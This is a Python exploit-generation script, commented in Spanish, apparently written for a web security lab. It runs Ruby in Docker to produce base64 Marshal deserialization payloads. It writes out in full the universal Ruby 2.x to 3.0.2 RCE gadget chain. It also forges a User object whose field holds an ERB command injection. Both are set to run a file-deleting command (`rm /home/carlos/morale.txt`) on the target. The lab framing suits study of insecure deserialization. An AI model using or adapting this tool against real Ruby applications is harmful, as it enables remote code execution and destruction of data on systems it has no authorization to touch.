#!/usr/bin/env python3
"""
Ruby Marshal SERIALIZER (via Docker)
=====================================
Genera un payload Marshal de Ruby y lo devuelve en base64.

Tres modos:
  "custom"  -> forja una instancia de una clase (con sus variables de instancia). Ej: un User real.
  "object"  -> serializa un objeto Ruby nativo (Hash/Array/String...) para entender el formato
  "gadget"  -> arma el gadget chain universal de RCE (vakzz, Ruby 2.x - 3.0.2)

Marshal es el serializador binario nativo de Ruby (equivalente a pickle en Python).
Python NO puede generar Marshal por si solo, asi que corremos Ruby dentro de Docker.

Uso:   python serialize.py
"""

import subprocess
import sys
import os
import time

# ============ EDITAR ACA ============
MODE        = "custom"                     # "custom" | "object" | "gadget"
RUBY_IMAGE  = "ruby:3.0-slim"              # el gadget universal anda hasta Ruby 3.0.2

# (custom) Forja un objeto de una clase arbitraria con sus variables de instancia.
# Es lo que necesita el lab: reconstruir un objeto User REAL (no un Hash).
# El server hace user.username -> tiene que ser una instancia de User, no un hash.
CLASS_NAME  = "User"
IVARS       = {
    "@username": "wiener",
    "@access_token": "ie69ggouqtu67202prrtxrdrurhujdqp",
    "@data": "<%= `rm /home/carlos/morale.txt` %>"
}

RUBY_OBJECT = '{"user"=>"admin","roles"=>[1,2,3]}'   # (object) literal Ruby nativo a serializar
COMMAND     = "rm /home/carlos/morale.txt"                                    # (gadget) comando a ejecutar en la victima
# ====================================

HERE = os.path.dirname(os.path.abspath(__file__))
DOCKER_DESKTOP = r"C:\Program Files\Docker\Docker\Docker Desktop.exe"


def docker_ok() -> bool:
    """True si el engine de Docker responde."""
    return subprocess.run(
        ["docker", "info"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode == 0


def ensure_docker() -> bool:
    """Si Docker no esta arriba, intenta levantar Docker Desktop y espera."""
    if docker_ok():
        return True
    print("[*] Docker no responde. Levantando Docker Desktop...")
    try:
        subprocess.Popen([DOCKER_DESKTOP])
    except FileNotFoundError:
        pass
    print("[*] Esperando a que arranque el engine...")
    for _ in range(60):
        time.sleep(2)
        if docker_ok():
            return True
    return False


def ruby_single_quoted(s: str) -> str:
    """Convierte un string de Python en un literal Ruby entre comillas simples (sin interpolacion)."""
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


def to_ruby_literal(value) -> str:
    """Convierte un valor de Python al literal Ruby equivalente (para las variables de instancia)."""
    if isinstance(value, bool):
        return "true" if value else "false"
    if value is None:
        return "nil"
    if isinstance(value, (int, float)):
        return str(value)
    # string -> comillas simples Ruby (sin interpolacion, sin sorpresas)
    return ruby_single_quoted(str(value))


def build_ruby() -> str:
    """Devuelve el codigo Ruby a ejecutar segun el modo."""
    if MODE == "custom":
        lines = [
            'require "base64"',
            # define la clase (o namespace A::B) si no existe, y devuelve la clase
            'def ensure_const(name)',
            '  ns = Object',
            '  name.split("::").each { |p| ns = ns.const_defined?(p, false) ? ns.const_get(p, false) : ns.const_set(p, Class.new) }',
            '  ns',
            'end',
            f'klass = ensure_const({ruby_single_quoted(CLASS_NAME)})',
            'obj = klass.allocate',
        ]
        for ivar, val in IVARS.items():
            name = ivar if ivar.startswith("@") else "@" + ivar
            lines.append(f'obj.instance_variable_set(:{name}, {to_ruby_literal(val)})')
        lines.append('STDOUT.write Base64.strict_encode64(Marshal.dump(obj))')
        return "\n".join(lines) + "\n"

    if MODE == "gadget":
        cmd = ruby_single_quoted(COMMAND)
        return f'''
require "base64"
# Gadget chain universal para RCE via Marshal.load (Ruby 2.x - 3.0.2)
# Fuente: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
Gem::SpecFetcher
Gem::Installer
module Gem
  class Requirement
    def marshal_dump; [@requirements]; end   # evita que el payload corra al hacer Marshal.dump
  end
end
wa1 = Net::WriteAdapter.new(Kernel, :system)
rs = Gem::RequestSet.allocate
rs.instance_variable_set("@sets", wa1)
rs.instance_variable_set("@git_set", {cmd})
wa2 = Net::WriteAdapter.new(rs, :resolve)
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set("@read", 0)
i.instance_variable_set("@header", "aaa")
n = Net::BufferedIO.allocate
n.instance_variable_set("@io", i)
n.instance_variable_set("@debug_output", wa2)
t = Gem::Package::TarReader.allocate
t.instance_variable_set("@io", n)
r = Gem::Requirement.allocate
r.instance_variable_set("@requirements", t)
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
STDOUT.write Base64.strict_encode64(payload)
'''
    else:  # object
        return f'''
require "base64"
obj = ({RUBY_OBJECT})
STDOUT.write Base64.strict_encode64(Marshal.dump(obj))
'''


def copy_to_clipboard(text: str) -> None:
    """Copia al portapapeles de Windows via clip.exe."""
    try:
        subprocess.run(["clip"], input=text, text=True, check=False)
    except Exception:
        pass


def main() -> int:
    if not ensure_docker():
        print("[X] Docker no arranco. Abri Docker Desktop a mano y volve a correr.")
        return 1
    print(f"[+] Docker OK  (imagen: {RUBY_IMAGE})")

    # Escribimos el Ruby a un archivo y lo montamos: subprocess pasa los args como lista,
    # asi que no hay problemas de comillas ni de longitud.
    rb_path = os.path.join(HERE, "_gen.rb")
    with open(rb_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(build_ruby())

    try:
        result = subprocess.run(
            ["docker", "run", "--rm", "-v", f"{HERE}:/work", "-w", "/work",
             RUBY_IMAGE, "ruby", "/work/_gen.rb"],
            capture_output=True, text=True,
        )
    finally:
        try:
            os.remove(rb_path)
        except OSError:
            pass

    payload = result.stdout.strip()
    if not payload:
        print("[X] No se genero payload. Salida de error de Ruby:")
        print(result.stderr)
        return 1

    print(f"[*] Modo: {MODE}")
    if MODE == "gadget":
        print(f"[*] Comando: {COMMAND}")
    elif MODE == "custom":
        print(f"[*] Objeto: {CLASS_NAME}  ivars={IVARS}")
    else:
        print(f"[*] Objeto: {RUBY_OBJECT}")
    print()
    print("=================== BASE64 (Marshal) ===================")
    print(payload)
    print("=======================================================")

    copy_to_clipboard(payload)
    print("[+] Copiado al portapapeles")
    print("[i] Para verificar/reconstruir:  python deserialize.py")
    return 0


if __name__ == "__main__":
    sys.exit(main())
